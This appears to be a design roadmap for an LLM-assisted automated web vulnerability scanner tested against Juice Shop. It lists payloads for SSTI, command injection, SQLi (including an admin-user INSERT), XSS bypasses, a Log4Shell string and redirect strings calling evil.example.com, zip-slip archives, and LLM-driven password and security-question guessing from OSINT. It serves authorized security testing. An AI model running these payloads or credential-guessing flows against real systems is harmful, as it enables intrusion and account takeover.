# Vulnerability Detection Coverage Roadmap

## Current State

- **Executor registry**: 83 test IDs wired to 16 generic executors
- **Test catalog**: 207 security tests defined
- **Current estimated coverage**: 43-50% (50-58 / 117 Juice Shop challenges)
- **Previous scan result**: 30 / 117 = 26%

## Design Principles (MUST follow)

1. **Fully generic** — every executor must work for ANY authorized website (healthcare, finance, social media, government, SaaS). Zero app-specific paths.
2. **Discovery-first** — all test targets come from endpoints discovered during recon. Use `_discovered_endpoints()` and `_endpoints_by_role()` to classify endpoints by semantic role. Only fall back to minimal generic probes (`/api`, `/login`) when discovery returns nothing.
3. **Evidence before confidence** — no evidence = no confirmed finding. Never convert timeout/invalid/scope-denial/empty into success.
4. **LLM reasons, Python owns state** — LLM generates strategies and reasoning. Deterministic Python code owns all state mutations, HTTP requests, and DB writes.
5. **DB is sole source of truth** — never read from .json or .log files to insert vulnerability data into the DB. Only the live scan pipeline writes to DB.
6. **Don't rewrite from scratch** — extend existing executor base classes (`GenericHTTPExecutor`, `ExecutorBase`). Add to the existing `executor_registry` in `central_brain.py`.
7. **Fail honestly** — if a test cannot run (no matching endpoints discovered, no auth token, timeout), report it as NOT_APPLICABLE or SCHEMA_ERROR, never as a false positive.

## Architecture Reference

### Key files

- `core/execution/executors/generic.py` — All generic HTTP executors. Base class `GenericHTTPExecutor` provides `_probe()`, `_discovered_endpoints()`, `_endpoints_by_role()`, `_auth_headers()`, `_endpoints_with_url_params()`, `_endpoints_with_ids()`, `_json_accepting_endpoints()`, `_state_changing_endpoints()`.
- `core/execution/executors/base.py` — Abstract `ExecutorBase` with `execute()`, `collect_evidence()`, `ExecutionResult` dataclass.
- `core/orchestration/central_brain.py` — `executor_registry` dict maps test IDs to executor instances. `_ingest_executor_findings()` converts evidence dicts to vulnerability records. Deterministic fallback sweeps all unexecuted tests. Credential chaining runs authenticated tests after spray success.
- `core/domain/experiment_v2.py` — `SecurityExperiment` dataclass. Required fields: `hypothesis_id`, `endpoint_id`, `capability`. Key field: `input_parameters` dict containing `url`, `endpoints` (list), `auth_token`, `cookie`.
- `agents/exploit_agent.py` — `PAYLOAD_REFERENCE` dict for LLM-guided exploitation. Add payload entries here for each new attack type.
- `core/coverage/security_test_catalog.py` — `SecurityTest` definitions. Add catalog entries for each new test ID.
- `agents/llm_client.py` — LLM client for DeepSeek API calls. Use for Tier 4/5 LLM-powered reasoning.

### Executor pattern

Every new executor must follow this pattern:

```python
class NewExecutor(GenericHTTPExecutor):
    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        # 1. Get test targets from discovered endpoints
        target_eps = self._to_paths(
            self._endpoints_by_role(experiment, "relevant_role"), base)
        if not target_eps:
            target_eps = ["/minimal", "/generic", "/fallback"]

        # 2. Run tests
        for ep in target_eps[:15]:  # cap to prevent timeout
            # ... test logic ...
            if vulnerable:
                findings.append({
                    "test": "test_name", "path": ep,
                    "status": status, "body_snippet": body[:256],
                })

        # 3. Return evidence
        evidence = self.collect_evidence({
            "newtype_findings": findings,  # key MUST end with _findings
            "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)
```

### Wiring checklist for each new executor

1. Add class to `core/execution/executors/generic.py`
2. Add import to `central_brain.py` (line ~118)
3. Add `self.new_executor = NewExecutor(timeout_seconds=30)` to `__init__` (line ~929)
4. Add test ID mappings to `self.executor_registry` (line ~930)
5. Add severity entry to `SEVERITY_MAP` in `_ingest_executor_findings()` (line ~3445)
6. Add `SecurityTest()` entries to `core/coverage/security_test_catalog.py`
7. Optionally add payload reference to `agents/exploit_agent.py` PAYLOAD_REFERENCE

### Semantic role keywords (for `_endpoints_by_role()`)

Already defined in `_ROLE_KEYWORDS` dict in `generic.py`:

```
auth:     login, signin, sign-in, auth, session, oauth, token, sso
user:     user, account, profile, me, member, customer, person, employee
admin:    admin, manage, dashboard, panel, control, backoffice, staff
data:     api, rest, graphql, v1, v2, v3
upload:   upload, file, attach, import, media, image, avatar, document, photo
redirect: redirect, goto, next, return, callback, continue, url, link, forward
search:   search, query, filter, find, lookup, browse, list
order:    order, cart, basket, checkout, purchase, payment, invoice, transaction, buy
config:   config, setting, preference, option, feature, flag
feedback: feedback, comment, review, rating, complain, ticket, support, contact
xml:      xml, soap, wsdl, rss, feed, atom, b2b, edi, export
```

Add new roles as needed for new executors (e.g., `captcha`, `password_reset`, `oauth`, `2fa`).

---

## Tier 1 — New Simple Executors (+15 challenges, 43% → 56%)

Pure code additions. Each is a new class in `generic.py` following the executor pattern. No new infrastructure needed.

### 1.1 SSTIExecutor

**Purpose**: Detect Server-Side Template Injection by injecting template expressions into all input fields and query parameters.

**Payloads** (must cover all major template engines):

```python
SSTI_PAYLOADS = [
    # Jinja2 / Twig / Nunjucks
    ("{{7*7}}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${7*7}", "49"),           # FreeMarker / Mako / EL
    ("#{7*7}", "49"),           # Ruby ERB / Thymeleaf
    ("<%= 7*7 %>", "49"),       # EJS / ERB
    ("{{constructor.constructor('return 7*7')()}}", "49"),  # Pug/Jade
    ("{{config}}", "SECRET"),   # Jinja2 config leak
    ("{{self.__class__}}", "class"),  # Python introspection
]
```

**Target selection**:
- Use `_all_endpoints_as_paths()` for all discovered endpoints
- Also target `_endpoints_by_role(experiment, "search", "feedback", "data")`
- Inject into query params: `?q={payload}`, `?name={payload}`, `?template={payload}`, `?input={payload}`
- Inject into POST body as form-encoded and JSON

**Detection**:
- If response contains the expected result string (e.g., "49"), it's SSTI
- If response contains "class", "SECRET_KEY", "config", it's info leak via SSTI
- If response contains template engine error messages (Jinja2, FreeMarker, etc.), it's a lead

**Test IDs**: `ssti_basic_01`, `ssti_sandbox_01`

**SEVERITY_MAP entry**: `"ssti": "CRITICAL"`

**Catalog entries**:
```python
SecurityTest("ssti_basic_01", "Server-Side Template Injection", "injection",
             "Inject template expressions into input fields", "CWE-1336", _always)
SecurityTest("ssti_sandbox_01", "SSTI Sandbox Escape", "injection",
             "Attempt sandbox escape via template injection", "CWE-1336", _always)
```

---

### 1.2 CommandInjectionExecutor

**Purpose**: Detect OS command injection by injecting shell metacharacters into all input parameters.

**Payloads**:

```python
CMDI_PAYLOADS = [
    # Blind detection (time-based)
    ("; sleep 5", "time_based"),
    ("| sleep 5", "time_based"),
    ("$(sleep 5)", "time_based"),
    ("`sleep 5`", "time_based"),
    # Output detection
    ("; echo CMDI_PROOF_7x7", "CMDI_PROOF_7x7"),
    ("| echo CMDI_PROOF_7x7", "CMDI_PROOF_7x7"),
    ("$(echo CMDI_PROOF_7x7)", "CMDI_PROOF_7x7"),
    # Windows
    ("& echo CMDI_PROOF_7x7", "CMDI_PROOF_7x7"),
    ("| type C:\\Windows\\win.ini", "[extensions]"),
    # URL-encoded
    ("%3B+echo+CMDI_PROOF_7x7", "CMDI_PROOF_7x7"),
    ("%7C+echo+CMDI_PROOF_7x7", "CMDI_PROOF_7x7"),
]
```

**Target selection**:
- All discovered endpoints, prioritize those with params that suggest user input: `cmd=`, `exec=`, `run=`, `command=`, `host=`, `ip=`, `ping=`, `domain=`, `filename=`
- POST body injection on `_json_accepting_endpoints()` and `_state_changing_endpoints()`

**Detection**:
- If response contains the proof string ("CMDI_PROOF_7x7") → confirmed
- If time-based: compare response time with baseline. If `sleep 5` adds >4 seconds → blind command injection
- If response contains "root:", "[extensions]", system info → confirmed

**Test IDs**: `cmdi_basic_01`, `cmdi_blind_01`

**SEVERITY_MAP entry**: `"cmdi": "CRITICAL"`

---

### 1.3 OpenRedirectExecutor

**Purpose**: Detect open redirect vulnerabilities by injecting external URLs into redirect parameters.

**Payloads**:

```python
REDIRECT_PAYLOADS = [
    "https://evil.example.com",
    "//evil.example.com",
    "/\\evil.example.com",
    "https://evil.example.com%00@target.com",
    "https://target.com@evil.example.com",
    "javascript:alert(1)",  # javascript: scheme
    "//evil.example.com/%2f%2e%2e",
    "https:evil.example.com",  # missing //
    "///evil.example.com",
    "////evil.example.com",
    "%0d%0aLocation:%20https://evil.example.com",  # CRLF + redirect
]
```

**Target selection**:
- `_endpoints_with_url_params()` — any endpoint with url/redirect/next/goto/to/return/callback params
- `_endpoints_by_role(experiment, "redirect")` — redirect-classified endpoints
- Also scan all discovered endpoints for params named: `redirect`, `redirect_url`, `redirect_uri`, `return`, `return_url`, `returnTo`, `next`, `goto`, `to`, `destination`, `redir`, `url`, `link`, `forward`, `continue`, `target`

**Detection**:
- If HTTP response is 301/302/303/307/308 and `Location` header contains "evil.example.com" → confirmed
- If response body contains "evil.example.com" in a meta refresh or JavaScript redirect → confirmed
- Follow redirect chain — if final destination is evil.example.com → confirmed

**Test IDs**: `redirect_basic_01`, `redirect_param_01`, `redirect_allowlist_bypass_01`

**SEVERITY_MAP entry**: `"redirect": "MEDIUM"`

---

### 1.4 OAuthMisconfigExecutor

**Purpose**: Detect OAuth/SSO misconfigurations — redirect_uri manipulation, token leakage, state parameter issues.

**Tests**:

1. **redirect_uri manipulation**: Find OAuth endpoints (discovery: look for `oauth`, `authorize`, `callback`, `sso`). Modify `redirect_uri` to attacker-controlled URL. Check if server accepts the modified redirect.

2. **Missing state parameter**: Submit OAuth flow without `state` parameter. If accepted → CSRF on OAuth.

3. **Token in URL fragment**: After OAuth callback, check if access_token appears in URL fragment or query string (should be in POST body or code flow only).

**Target selection**:
- Add new role to `_ROLE_KEYWORDS`: `"oauth": ["oauth", "authorize", "callback", "sso", "openid", ".well-known/openid", "oidc"]`
- `_endpoints_by_role(experiment, "oauth", "auth")`
- Probe `/.well-known/openid-configuration` for OAuth metadata

**Detection**:
- If server redirects to attacker's redirect_uri → confirmed
- If state parameter can be omitted → CSRF risk
- If token visible in URL → token leakage

**Test IDs**: `oauth_redirect_01`, `oauth_state_01`, `oauth_token_leak_01`

**SEVERITY_MAP entry**: `"oauth": "HIGH"`

---

### 1.5 CAPTCHABypassExecutor

**Purpose**: Test if CAPTCHA protection can be bypassed.

**Tests**:

1. **Token reuse**: Solve CAPTCHA once (or use empty token), capture the token, resubmit the same token on subsequent requests
2. **Missing CAPTCHA**: Submit the form without any CAPTCHA field at all
3. **Empty CAPTCHA**: Submit with empty captcha field
4. **Remove CAPTCHA param**: Submit form with CAPTCHA parameter removed entirely

**Target selection**:
- Add new role: `"captcha": ["captcha", "recaptcha", "hcaptcha", "challenge", "verify"]`
- `_endpoints_by_role(experiment, "captcha", "feedback", "auth")` — forms that typically have CAPTCHA
- POST to discovered form endpoints without CAPTCHA token

**Detection**:
- If request succeeds (200/201) without valid CAPTCHA → bypass confirmed
- If same token works twice → token reuse vulnerability

**Test IDs**: `captcha_bypass_01`, `captcha_reuse_01`

**SEVERITY_MAP entry**: `"captcha": "MEDIUM"`

---

### 1.6 PasswordPolicyExecutor

**Purpose**: Test if the application accepts weak passwords during registration or password change.

**Weak passwords to test**:

```python
WEAK_PASSWORDS = [
    "a",           # too short
    "123",         # numbers only
    "password",    # dictionary word
    "12345678",    # sequential
    "qwerty",      # keyboard pattern
    "test",        # common
    "",            # empty
]
```

**Target selection**:
- `_endpoints_by_role(experiment, "auth", "user")` — registration and password change endpoints
- POST with `{"email": "pwtest_{timestamp}@test.com", "password": weak, "passwordRepeat": weak}`
- Also try password change: PUT/PATCH to user endpoints with `{"password": weak, "new": weak}`

**Detection**:
- If registration succeeds (200/201) with a weak password → weak policy
- If password change succeeds with weak password → weak policy

**Test IDs**: `password_policy_01`, `password_strength_01`

**SEVERITY_MAP entry**: `"password": "MEDIUM"`

---

### 1.7 RateLimitExecutor

**Purpose**: Detect missing rate limiting on sensitive endpoints.

**Tests**:

1. **Login brute-force protection**: Send 20 rapid login attempts with wrong password. If no 429/block → missing rate limit.
2. **Registration flood**: Send 10 rapid registration requests with same email. If all succeed → missing duplicate prevention.
3. **API abuse**: Send 50 rapid requests to any API endpoint. If all return 200 → no rate limiting.

**Target selection**:
- `_endpoints_by_role(experiment, "auth")` — login endpoints for brute-force test
- `_endpoints_by_role(experiment, "user")` — registration endpoints for flood test
- `_state_changing_endpoints()` — all state-changing endpoints for general rate limit test

**Detection**:
- If no 429 status after N rapid requests → no rate limiting
- If same action can repeat N times → no duplicate prevention
- Track response times — if they don't increase (no exponential backoff) → weak protection

**Test IDs**: `ratelimit_login_01`, `ratelimit_registration_01`, `ratelimit_api_01`

**SEVERITY_MAP entry**: `"ratelimit": "MEDIUM"`

---

### 1.8 LogInjectionExecutor

**Purpose**: Detect log injection / log forging vulnerabilities.

**Payloads**:

```python
LOG_PAYLOADS = [
    "test\r\n[CRITICAL] Admin login from 127.0.0.1",  # CRLF log forging
    "test%0d%0a[CRITICAL] Admin login from 127.0.0.1",  # URL-encoded
    "test\nINFO: User admin logged in successfully",  # newline injection
    "${jndi:ldap://evil.example.com/a}",  # Log4Shell
    "{{7*7}}",  # template injection in logs
]
```

**Target selection**:
- Inject via HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Real-IP`
- Inject via login endpoint username field
- Inject via any search/query parameter
- Check if `/logs`, `/api/logs`, `/admin/logs`, `/access.log` exposes logs

**Detection**:
- If injected payload appears verbatim in response or accessible log file → confirmed
- If Log4Shell payload triggers outbound DNS lookup (time-based or response difference) → critical
- If log file is accessible at common paths → info disclosure

**Test IDs**: `log_injection_01`, `log_forging_01`

**SEVERITY_MAP entry**: `"log": "MEDIUM"`

---

### 1.9 BackupFileScannerExecutor

**Purpose**: Discover exposed backup files, hidden directories, and sensitive files.

**Suffixes to append to every discovered path**:

```python
BACKUP_SUFFIXES = [
    ".bak", ".backup", ".old", ".orig", ".save",
    "~", ".swp", ".swo",
    ".sql", ".sql.gz", ".sql.bak",
    ".zip", ".tar.gz", ".tar", ".gz", ".rar",
    ".log", ".log.1", ".log.bak",
    ".env", ".env.bak", ".env.local", ".env.production",
    ".config", ".conf", ".cfg",
    ".php.bak", ".asp.bak", ".jsp.bak",
    ".DS_Store", "Thumbs.db",
    ".git/HEAD", ".svn/entries", ".hg/store",
]
```

**Common hidden paths to probe**:

```python
HIDDEN_PATHS = [
    "/ftp", "/backup", "/backups", "/dump", "/export",
    "/old", "/archive", "/temp", "/tmp", "/test",
    "/.git/HEAD", "/.svn/entries", "/.env",
    "/robots.txt", "/sitemap.xml",
    "/server-status", "/server-info",
    "/.well-known/security.txt",
    "/package.json", "/package-lock.json", "/composer.json",
    "/Dockerfile", "/docker-compose.yml",
    "/wp-config.php.bak", "/web.config.bak",
    "/.htaccess", "/.htpasswd",
]
```

**Target selection**:
- For suffix test: take every discovered endpoint path, strip query string, append each suffix
- For hidden paths: probe each against base URL
- Cap total probes to prevent timeout (max 100)

**Detection**:
- If status 200 and response body contains actual content (not error page, not empty) → file exposed
- Check Content-Type: if it's `application/octet-stream`, `application/zip`, `text/plain` with sensitive content → confirmed
- If `.git/HEAD` returns "ref: refs/heads/" → git repo exposed
- If `.env` returns KEY=VALUE format → env file exposed

**Test IDs**: `backup_file_01`, `backup_directory_01`, `hidden_file_01`, `git_exposure_01`, `env_exposure_01`

**SEVERITY_MAP entry**: `"backup": "HIGH"`

---

## Tier 2 — Enhance Existing Executors (+10 challenges, 56% → 64%)

Modify existing executor classes with additional payloads and attack modes.

### 2.1 Advanced SQLi Payloads

**File**: Enhance existing SQLi executor (not in `generic.py` — it's the separate `sqli_executor`)

**Add these attack modes**:

1. **UNION-based extraction**:
```python
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # Column count detection
    "' ORDER BY 1--", "' ORDER BY 2--", "' ORDER BY 5--", "' ORDER BY 10--",
    # Schema extraction (SQLite)
    "' UNION SELECT sql,NULL FROM sqlite_master--",
    "' UNION SELECT name,sql FROM sqlite_master--",
    # Schema extraction (MySQL)
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    # Schema extraction (PostgreSQL)
    "' UNION SELECT tablename,NULL FROM pg_tables--",
]
```

2. **INSERT-based** (create records via injection):
```python
INSERT_PAYLOADS = [
    "'; INSERT INTO users (email,password,role) VALUES ('injected@test.com','pass','admin')--",
]
```

3. **Time-based blind** (for cases where no output is reflected):
```python
TIME_PAYLOADS = [
    "' OR SLEEP(5)--",       # MySQL
    "' OR pg_sleep(5)--",    # PostgreSQL
    "'; WAITFOR DELAY '0:0:5'--",  # MSSQL
    "' OR 1=1 AND RANDOMBLOB(500000000)--",  # SQLite (heavy computation)
]
```

**Detection**: Compare response time for time-based payloads against baseline. If >4 seconds slower → blind SQLi confirmed.

---

### 2.2 Advanced XSS — Stored XSS Flow + Filter Bypass

**File**: Enhance XSS executor + add stored XSS capability

**Stored XSS flow** (two-phase test):

```
Phase 1: POST payload to a state-changing endpoint (feedback, comment, profile)
  Body: {"comment": "<script>/*XSS_PROOF_12345*/</script>"}

Phase 2: GET the page/API that renders stored content
  Check: if response contains "XSS_PROOF_12345" → stored XSS confirmed
```

**Filter bypass payloads**:

```python
XSS_BYPASS_PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<details/open/ontoggle=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path d="z"></textarea>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<iframe srcdoc="<script>alert(1)</script>">',
    # Encoding bypass
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    # Case variation
    '<ScRiPt>alert(1)</ScRiPt>',
    '<IMG SRC=JaVaScRiPt:alert(1)>',
]
```

**Header injection XSS**: Inject XSS payloads via `Referer`, `User-Agent`, `X-Forwarded-For` headers. If reflected in response → header-based XSS.

---

### 2.3 Advanced JWT Attacks

**File**: Enhance `JWTExecutor` in `generic.py`

**Add these attacks**:

1. **RS256 → HS256 key confusion**:
```
- Fetch the target's public key from /jwks.json, /.well-known/jwks.json, or /api/keys
- Re-sign the JWT using HS256 with the public key as the HMAC secret
- Send the forged token and check if accepted
```

2. **jku/jwk header injection**:
```
- Create a JWT with {"jku": "https://evil.example.com/jwks.json"} or {"jwk": {...}}
- The evil JWK set contains attacker's public key
- Sign with attacker's private key
- If accepted → jku/jwk injection
```

3. **kid injection**:
```
- Set kid to "../../dev/null" or "' UNION SELECT 'secret'--"
- Sign with corresponding key (empty string for /dev/null)
- If accepted → kid path traversal or SQLi
```

---

### 2.4 Advanced PathTraversal + FileUpload

**File**: Enhance `PathTraversalExecutor` and `FileUploadExecutor` in `generic.py`

**Additional traversal vectors**:

```python
# LFI via parameters (not just path)
LFI_PARAMS = ["file", "page", "template", "lang", "include", "path",
              "doc", "view", "content", "document", "layout", "theme"]

# For each discovered endpoint with these params, inject traversal payloads
```

**Zip slip test for FileUploadExecutor**:

```python
# Create a zip file in memory with a path-traversal entry name
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    zf.writestr("../../etc/test_write.txt", "zipslip_proof")
# Upload this zip to discovered upload endpoints
```

**Symlink in archive**:

```python
# Create a tar with a symlink pointing to /etc/passwd
import tarfile, io
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode='w:gz') as tf:
    info = tarfile.TarInfo(name="link.txt")
    info.type = tarfile.SYMTYPE
    info.linkname = "/etc/passwd"
    tf.addfile(info)
```

---

## Tier 3 — New Tool Integrations (+9 challenges, 64% → 72%)

These require either fetching external data or running external tools.

### 3.1 SCA / Dependency Scanner

**Purpose**: Detect vulnerable and outdated JavaScript/Python dependencies.

**Implementation approach**:

1. **Fetch package manifest**: Try to access `/package.json`, `/package-lock.json`, `/yarn.lock`, `/requirements.txt`, `/Gemfile.lock`, `/composer.json`, `/pom.xml` from the target
2. **Parse dependencies**: Extract package names and version numbers
3. **Check against vulnerability databases**:
   - **Option A (preferred)**: Query OSV.dev API (free, no auth needed): `POST https://api.osv.dev/v1/query` with `{"package": {"name": "lodash", "ecosystem": "npm"}, "version": "4.17.15"}`
   - **Option B**: Run `npm audit --json` if npm is available in the Docker container
   - **Option C**: Maintain a local list of top 100 known vulnerable packages with affected version ranges
4. **Report findings**: Each vulnerable dependency = one finding with CVE ID, affected version, and fixed version

**Target selection**: No endpoint discovery needed — just probe known manifest file paths on the target.

**Detection**: If manifest file is accessible AND contains packages with known CVEs → confirmed vulnerability.

**Test IDs**: `sca_npm_01`, `sca_outdated_01`, `sca_cve_01`

**SEVERITY_MAP entry**: `"sca": "HIGH"`

---

### 3.2 Typosquatting Detector

**Purpose**: Detect potentially malicious typosquatted dependencies in package manifests.

**Implementation**:

1. Fetch and parse `/package.json` (or other manifest)
2. For each dependency, compute Levenshtein edit distance against a list of top 500 popular npm packages
3. If a dependency is within edit distance 1-2 of a popular package but is NOT the popular package → potential typosquat
4. Also check for common typosquat patterns: missing hyphen (`lodash` vs `lo-dash`), character swap, added prefix/suffix

**Popular packages reference** (embed top 200):
```python
POPULAR_PACKAGES = [
    "lodash", "express", "react", "axios", "moment", "chalk",
    "debug", "commander", "inquirer", "webpack", "babel-core",
    "typescript", "jquery", "underscore", "async", "bluebird",
    "request", "uuid", "glob", "minimist", "yargs", "fs-extra",
    # ... top 200
]
```

**Test IDs**: `sca_typosquat_01`

---

### 3.3 WAF / Monitoring Evasion Detector

**Purpose**: Detect if WAF/rate-limiting can be bypassed.

**Tests**:

1. **WAF detection**: Send a known malicious payload (e.g., `<script>alert(1)</script>`) and check for WAF signatures in response (403, custom error page, WAF headers like `X-Sucuri-ID`, `cf-ray`, `X-CDN`).
2. **Evasion techniques**: If WAF detected, try:
   - URL encoding: `%3Cscript%3E`
   - Double URL encoding: `%253Cscript%253E`
   - Unicode: `＜script＞`
   - Case variation: `<ScRiPt>`
   - Comment insertion: `<scr/**/ipt>`
   - Null byte: `<scr%00ipt>`
   - Chunked transfer encoding
3. **If evasion works** (payload passes through WAF) → WAF bypass confirmed

**Test IDs**: `waf_detect_01`, `waf_bypass_01`

**SEVERITY_MAP entry**: `"waf": "MEDIUM"`

---

## Tier 4 — LLM-Powered Reasoning (+14 challenges, 72% → 84%)

These use the existing DeepSeek LLM to reason about the target application's business logic, user data, and security questions.

### 4.1 Security Question Solver

**Purpose**: Use LLM + OSINT data to guess answers to security questions for password reset.

**Implementation flow**:

```
1. Discover password reset endpoint:
   - _endpoints_by_role(experiment, "auth", "user")
   - Look for /forgot-password, /reset-password, /api/SecurityQuestions

2. Enumerate users:
   - From credential spray results, OSINT discoveries, or registration error messages
   - Common user formats: admin@target.com, user@target.com

3. Fetch security question for each user:
   - GET /api/SecurityQuestions/{userId} or similar

4. Feed to LLM:
   Prompt: "Given the following information about a user:
   - Username: {username}
   - Email: {email}
   - OSINT data found during recon: {osint_context}
   - Security question: {question}

   Generate the 20 most likely answers to this security question.
   Consider: common pet names, mother's maiden names, cities,
   schools, based on the user's likely background."

5. Try each answer:
   - POST /api/SecurityAnswers with each candidate
   - If any returns 200 with a password reset token → confirmed

6. This is a GENERIC flow — works for ANY site with security questions
```

**Key design decisions**:
- The executor does NOT know what the security questions will be — the LLM handles that
- OSINT context comes from `ctx.osint_results` populated during recon phase
- The executor caps at 20 attempts per user to avoid account lockout
- The executor uses `_endpoints_by_role(experiment, "auth")` to find the right endpoints

**Test IDs**: `auth_security_question_01`, `auth_password_reset_01`

**SEVERITY_MAP entry**: `"auth": "HIGH"` (already exists)

---

### 4.2 LLM Password Derivation

**Purpose**: Use LLM to derive likely passwords from OSINT data about discovered users.

**Implementation flow**:

```
1. Collect known usernames from:
   - Credential spray results
   - User enumeration (registration error: "email already exists")
   - OSINT (LinkedIn, GitHub, social media found during recon)

2. For each username, prompt LLM:
   "Given this user information:
   - Username: {username}
   - Email: {email}
   - Name (if known): {name}
   - Other OSINT: {context}

   Generate the 30 most likely passwords this person would use.
   Include:
   - Name-based: firstname123, Firstname!, lastname2024
   - Keyboard patterns: qwerty, 123456, admin123
   - Pop culture references if username suggests interests
   - Common patterns: Password1!, Welcome1, Summer2024!
   - Company-based: {company_name}123
   Return as a JSON array of strings."

3. Try each password against the login endpoint
4. On success → harvested credential → trigger credential chaining
```

**Test IDs**: `auth_password_guess_01`, `auth_osint_password_01`

---

### 4.3 LLM Business Logic Explorer

**Purpose**: Use LLM to understand the application's business logic flows and generate targeted bypass tests.

**Implementation flow**:

```
1. Feed LLM the discovered API structure:
   Prompt: "Here are the API endpoints discovered on this application:
   {endpoint_list_with_methods_and_params}

   Analyze these endpoints and identify:
   1. Multi-step workflows (e.g., add-to-cart → checkout → payment → confirm)
   2. Endpoints that should require authentication but might not
   3. Endpoints where parameter values could be manipulated (prices, quantities, IDs)
   4. GDPR-relevant endpoints (data export, data deletion)
   5. Endpoints that might have hidden/unlisted items or features
   6. Business rules that could be bypassed (coupon expiry, quantity limits)

   For each identified flow, generate a specific HTTP request sequence
   to test the bypass. Return as JSON."

2. Execute each suggested test sequence
3. Compare expected vs actual behavior
4. If bypass works → business logic vulnerability
```

**This is where the LLM shines** — it can reason about app-specific business logic that no hardcoded executor can cover.

**Test IDs**: `bizlogic_llm_01`, `bizlogic_workflow_01`, `bizlogic_gdpr_01`

**SEVERITY_MAP entry**: `"bizlogic": "MEDIUM"` (already exists)

---

## Tier 5 — Advanced / Exotic (+9 challenges, 84% → 92%)

Complex capabilities that require specialized logic.

### 5.1 2FA Bypass Executor

**Purpose**: Test if two-factor authentication can be bypassed.

**Tests**:

1. **Skip 2FA step**: After successful login (step 1), directly access authenticated endpoints without completing 2FA (step 2). If accessible → 2FA bypass.

2. **TOTP brute-force**: If TOTP is used, try all 000000-999999 codes in rapid succession (if no rate limiting — combine with RateLimitExecutor). Note: only do this if rate limit test confirms no blocking.

3. **Backup code reuse**: If backup codes are issued, try reusing the same backup code multiple times.

4. **2FA disable without verification**: Try disabling 2FA via API without providing current 2FA code.

**Target selection**:
- Add role: `"2fa": ["2fa", "two-factor", "totp", "mfa", "otp", "verify-code", "verify-token"]`
- `_endpoints_by_role(experiment, "2fa", "auth")`

**Test IDs**: `mfa_bypass_01`, `mfa_brute_01`, `mfa_disable_01`

**SEVERITY_MAP entry**: `"mfa": "CRITICAL"`

---

### 5.2 Crypto Weakness Detector

**Purpose**: Detect weak cryptographic implementations.

**Tests**:

1. **Weak hash detection**: Check if passwords are stored as MD5, SHA1, or base64 (look for hash patterns in API responses, error messages, password reset tokens).

2. **Encoding detection**: Check cookies and tokens for base64 content. Decode and check if they contain user data, session info, or predictable values.

3. **Weak random**: Check if tokens/IDs are sequential or predictable. Generate two tokens in rapid succession and check if they're close in value.

4. **Client-side crypto**: Check if premium/paywall features use client-side JWT or cookie checks that can be manipulated.

**Detection patterns**:

```python
CRYPTO_PATTERNS = [
    (r'^[a-f0-9]{32}$', "MD5 hash"),
    (r'^[a-f0-9]{40}$', "SHA1 hash"),
    (r'^[A-Za-z0-9+/]+={0,2}$', "Base64 encoded"),  # Try decode
    (r'^\d{10,}$', "Unix timestamp (predictable)"),
    (r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', "UUIDv1 (time-based, predictable)"),
]
```

**Test IDs**: `crypto_weak_hash_01`, `crypto_encoding_01`, `crypto_random_01`

**SEVERITY_MAP entry**: `"crypto": "HIGH"`

---

### 5.3 LLM Content Analyzer

**Purpose**: Use LLM to analyze page content for hidden information, easter eggs, sensitive data leaks.

**Implementation flow**:

```
1. Fetch pages that might contain hidden info:
   - /security.txt, /robots.txt, /humans.txt
   - Privacy policy, Terms of Service, About pages
   - HTML comments in all discovered pages
   - JavaScript source files (look for embedded secrets, API keys, hidden endpoints)
   - HTTP response headers across all endpoints

2. Feed content to LLM:
   Prompt: "Analyze this web page content for security issues:
   {page_content}

   Look for:
   1. Hidden HTML comments with sensitive info (passwords, TODOs, internal URLs)
   2. Hardcoded API keys, tokens, or secrets in JavaScript
   3. Hidden form fields with sensitive defaults
   4. Debug information left in production
   5. Internal IP addresses or hostnames
   6. Hidden features or admin functionality referenced in code
   7. Deprecated API versions still accessible
   8. Information that could help an attacker (usernames, email patterns, tech stack details)

   Return findings as JSON with location, type, and severity."

3. For each finding, verify by making an HTTP request
4. If verified → confirmed finding
```

**Test IDs**: `content_analysis_01`, `hidden_info_01`, `js_secrets_01`

**SEVERITY_MAP entry**: `"content": "MEDIUM"`

---

## Unreachable Ceiling (~8 challenges, 93-100%)

These challenges are unlikely to be automated reliably. They are puzzle-type challenges that require human creativity, obscure knowledge, or multi-step reasoning beyond current LLM capability:

| Challenge | Why it's hard | Theoretical approach |
|-----------|---------------|---------------------|
| Steganography | Hidden data in images | Would need steganography library (python-stegano) + LLM to identify which images to analyze |
| Video XSS | XSS in subtitle files | Very app-specific, needs to understand video player subtitle parsing |
| Nested Easter Egg | Multi-step base64 + ROT13 decode chain | LLM could attempt but no reliable automation |
| Blockchain Hype | Blockchain-specific knowledge | Domain-specific, not a generic vulnerability |
| Wallet Depletion | Complex race condition chain | Needs precise timing + understanding of wallet flow |
| Stored XSS Tier 2 | Difficulty 5, contextual filter bypass | Would need app-specific DOM analysis |
| Reflected XSS Tier 2 | Difficulty 4, advanced bypass | May be reachable with exhaustive payload list |
| Login Support Team | Difficulty 6, complex OSINT chain | Would need extremely good OSINT + SQLi combo |

